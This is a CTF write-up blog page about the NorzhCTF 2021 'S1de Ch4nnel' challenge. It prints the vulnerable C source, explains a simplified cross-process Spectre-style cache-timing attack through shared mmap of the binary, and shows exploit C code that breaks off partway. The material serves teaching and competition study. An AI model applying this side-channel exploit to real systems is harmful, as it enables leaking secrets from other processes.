@@ -1,0 +1,397 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="CTF Writeup - NorzhCTF - S1de Ch4nnel" /><meta name="author" content="RAC" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction S1de Ch4nnel was a challenge at NorzhCTF 2021." /><meta property="og:description" content="Introduction S1de Ch4nnel was a challenge at NorzhCTF 2021." /><link rel="canonical" href="https://richard-ac.github.io/posts/NORZH-sidechannel/" /><meta property="og:url" content="https://richard-ac.github.io/posts/NORZH-sidechannel/" /><meta property="og:site_name" content="RAC Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-25T19:33:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="CTF Writeup - NorzhCTF - S1de Ch4nnel" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@RAC" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"RAC"},"description":"Introduction S1de Ch4nnel was a challenge at NorzhCTF 2021.","url":"https://richard-ac.github.io/posts/NORZH-sidechannel/","@type":"BlogPosting","headline":"CTF Writeup - NorzhCTF - S1de Ch4nnel","dateModified":"2021-09-18T09:23:10+08:00","datePublished":"2021-05-25T19:33:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://richard-ac.github.io/posts/NORZH-sidechannel/"},"@context":"https://schema.org"}</script><title>CTF Writeup - NorzhCTF - S1de Ch4nnel | RAC Blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script defer src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script> <script defer src="/app.js"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-9VRMP80RNQ"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-9VRMP80RNQ'); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/sample/RAC.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">RAC Blog</a></div><div class="site-subtitle font-italic">Exploit Development, Vulnerability Research and Systems Programming</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/disclosures/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>DISCLOSURES</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Richard-AC" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xrac','protonmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>CTF Writeup - NorzhCTF - S1de Ch4nnel</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>CTF Writeup - NorzhCTF - S1de Ch4nnel</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, May 25, 2021, 7:33 PM +0800" > May 25, 2021 <i class="unloaded">2021-05-25T19:33:00+08:00</i> </span> by <span class="author"> RAC </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 18, 2021, 1:23 AM +0000" > Sep 18, 2021 <i class="unloaded">2021-09-18T09:23:10+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1243 words">6 min</span></div></div><div class="post-content"><h2 id="introduction">Introduction</h2><hr /><p>S1de Ch4nnel was a challenge at <a href="https://ctftime.org/event/1301">NorzhCTF 2021</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/norzh_sidechannel/challenge_description.png" alt="" /></p><p>You can download the challenge <a href="/assets/files/NORZH/challenge.tar.gz">here</a> and my commented solution <a href="/assets/files/NORZH/xpl.c">there</a>.</p><h2 id="challenge-presentation">Challenge presentation</h2><hr /><p>When we ssh into the machine we are given a binary <code class="language-plaintext highlighter-rouge">chall</code> and the corresponding code <code class="language-plaintext highlighter-rouge">main.c</code>:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;x86intrin.h&gt;
+</span>
+<span class="cp">#define PAGE_SIZE 512
+</span>
+<span class="cp">#define FLAG_SIZE 28
+</span>
+<span class="cp">#define DEBUG 0
+</span>
+<span class="k">const</span> <span class="kt">char</span> <span class="n">the_array</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">[</span><span class="mi">0</span> <span class="p">...</span> <span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">};</span>
+
+<span class="k">const</span> <span class="kt">size_t</span> <span class="n">baby_array_size</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+
+<span class="k">static</span> <span class="kt">char</span> <span class="n">secret_value</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+<span class="k">static</span> <span class="kt">char</span> <span class="n">baby_array</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">16</span>
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="nf">victim_function</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">x</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">y</span> <span class="o">=</span> <span class="n">the_array</span><span class="p">[</span><span class="n">baby_array</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">y</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">baby_array_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">baby_array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"./flag.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"Error while opening the file.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">secret_value</span><span class="p">,</span> <span class="n">FLAG_SIZE</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+
+
+    <span class="k">if</span><span class="p">(</span><span class="n">DEBUG</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Flag : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">secret_value</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Baby_array to secret_value offset is %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">secret_value</span> <span class="o">-</span> <span class="n">baby_array</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="kt">size_t</span> <span class="n">x</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">nb_read</span><span class="p">;</span>
+
+    <span class="cm">/* Make the access to the secret value faster*/</span>
+    <span class="n">__asm__</span> <span class="k">volatile</span><span class="p">(</span><span class="s">"lea %0, %%rax</span><span class="se">\n</span><span class="s">"</span>
+                     <span class="s">"movb (%%rax), %%al</span><span class="se">\n</span><span class="s">"</span> <span class="o">::</span><span class="s">"m"</span><span class="p">(</span><span class="n">secret_value</span><span class="p">)</span>
+                     <span class="o">:</span><span class="p">);</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">memset</span> <span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
+        <span class="n">printf</span> <span class="p">(</span><span class="s">"Please give me an int : </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+        <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">nb_read</span> <span class="o">=</span> <span class="n">read</span> <span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">1</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">nb_read</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">nb_read</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">i</span><span class="o">++</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">strtoul</span> <span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">victim_function</span> <span class="p">(</span><span class="n">x</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</pre></table></code></div></div><p>The program starts by initializing a few global arrays:</p><ul><li><code class="language-plaintext highlighter-rouge">secret_value</code>, in which the flag is later copied<li><code class="language-plaintext highlighter-rouge">baby_array</code>, a small array of 16 chars<li><code class="language-plaintext highlighter-rouge">the_array</code>, a 256 pages long array initialized with all ones</ul><p>The program then enters a loop where it prompts us for an int and calls the <code class="language-plaintext highlighter-rouge">victim_function</code> with the provided value <code class="language-plaintext highlighter-rouge">x</code> as the argument.</p><p>This function simply accesses <code class="language-plaintext highlighter-rouge">the_array[baby_array[x] * PAGE_SIZE]</code> and then returns. There is an obvious out of bounds access as <code class="language-plaintext highlighter-rouge">baby_array</code> is only of length 16 while <code class="language-plaintext highlighter-rouge">x</code> is allowed to be up to 100.</p><p>To see how we might exploit this, let’s check what lies after <code class="language-plaintext highlighter-rouge">baby_array</code> in memory:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/norzh_sidechannel/memory_layout.png" alt="" /></p><p>Sure enough, the flag is close by. Specifically, it starts 48 bytes after the beginning of <code class="language-plaintext highlighter-rouge">baby_array</code>.</p><h2 id="exploitation-strategy">Exploitation strategy</h2><hr /><p>If you want more details I recommend reading <a href="https://spectreattack.com/spectre.pdf">the original Spectre article</a> as this is pretty much a simplified version of the attack (without relying on speculative execution).</p><p>We start by flushing all the pages of <code class="language-plaintext highlighter-rouge">the_array</code> out of the cache then ask the program to access <code class="language-plaintext highlighter-rouge">the_array[baby_array[48] * PAGE_SIZE]</code>. Remember that <code class="language-plaintext highlighter-rouge">baby_array[48]</code> is the first byte of the flag. Let’s say it’s an ‘N’ which is ascii 78, this means that the page 78 of <code class="language-plaintext highlighter-rouge">the_array</code> will be placed in cache.</p><p>We then measure the access times to <code class="language-plaintext highlighter-rouge">the_array[i * PAGE_SIZE]</code> for <code class="language-plaintext highlighter-rouge">i</code> between 0 and 255. Accessing <code class="language-plaintext highlighter-rouge">the_array[78 * PAGE_SIZE]</code> should be faster than the others since it is a cache hit.</p><p>Doing so we can deduce the value of <code class="language-plaintext highlighter-rouge">baby_array[48]</code> which is the first byte of the flag. Repeating this <code class="language-plaintext highlighter-rouge">FLAG_SIZE</code> times we leak the whole flag.</p><h2 id="cross-process-spectre-attack">Cross process Spectre attack</h2><hr /><p>But how do we access and time <code class="language-plaintext highlighter-rouge">the_array[i * PAGE_SIZE]</code> for arbitrary values of <code class="language-plaintext highlighter-rouge">i</code>?</p><p>Remember that <code class="language-plaintext highlighter-rouge">the_array</code> is an initialized const variable so it is placed in the .rodata section of the binary. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/norzh_sidechannel/the_array_rodata.png" alt="" /> If we mmap the <code class="language-plaintext highlighter-rouge">chall</code> binary file in the attacker process’ address space and execute <code class="language-plaintext highlighter-rouge">chall</code> at the same time, this memory will be shared. This means that it is backed by the same physical RAM and subject to the same cache hits / misses in both processes. This allows us to do the measurements from the attacker process.</p><h2 id="exploit-code">Exploit code</h2><hr /><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;x86intrin.h&gt;
+</span>
+<span class="cp">#define PAGE_SIZE 512
+#define FLAG_SIZE 28
+</span>
+<span class="c1">// Might need to change this depending on your 'chall' binary</span>
+<span class="cp">#define CHALL_FILE_SIZE 0x24ec8
+</span><span class="c1">// objdump -d ./chall -j .rodata | grep "the_array"</span>
+<span class="cp">#define OFFSET_TO_THE_ARRAY 0x2020
+</span>
+<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">the_array</span><span class="p">;</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">map_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">,</span> <span class="mo">0666</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to open file"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">CHALL_FILE_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span> <span class="n">perror</span><span class="p">(</span><span class="s">"mmap"</span><span class="p">);</span> <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+    <span class="k">return</span> <span class="n">mem</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">access_value</span><span class="p">(</span><span class="kt">char</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* Wrapper to prevent optimizations */</span>
+    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">x</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* Measure the access time to the_array[i * PAGE_SIZE]
+ * for i in [0, 255] and return the value of i corresponding
+ * to the shortest access time
+ */</span>
+<span class="kt">char</span> <span class="nf">get_min_access_time</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">best_candidate</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">min_time</span> <span class="o">=</span> <span class="mi">99999</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Access in 'random' order to prevent stride optimization</span>
+        <span class="c1">// which can  distort the timing results</span>
+        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="p">((</span><span class="n">j</span> <span class="o">*</span> <span class="mi">167</span><span class="p">)</span> <span class="o">+</span> <span class="mi">13</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
+        <span class="c1">//int i = j;</span>
+
+                <span class="kt">int</span> <span class="n">before</span><span class="p">,</span> <span class="n">after</span><span class="p">;</span>
+
+        <span class="n">before</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
+        <span class="n">access_value</span><span class="p">(</span><span class="n">the_array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">]);</span>
+        <span class="n">_mm_lfence</span><span class="p">();</span> <span class="c1">// Makes sure 'after' is measured when 'access_value' is done</span>
+        <span class="n">after</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
+
+        <span class="kt">uint32_t</span> <span class="n">diff</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">after</span><span class="o">-</span><span class="n">before</span><span class="p">);</span>
+
+        <span class="c1">// For some reason the leak is less accurate without the following line</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Access time : %c : %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">diff</span><span class="p">);</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">diff</span> <span class="o">&lt;</span> <span class="n">min_time</span><span class="p">){</span>
+            <span class="n">min_time</span> <span class="o">=</span> <span class="n">diff</span><span class="p">;</span>
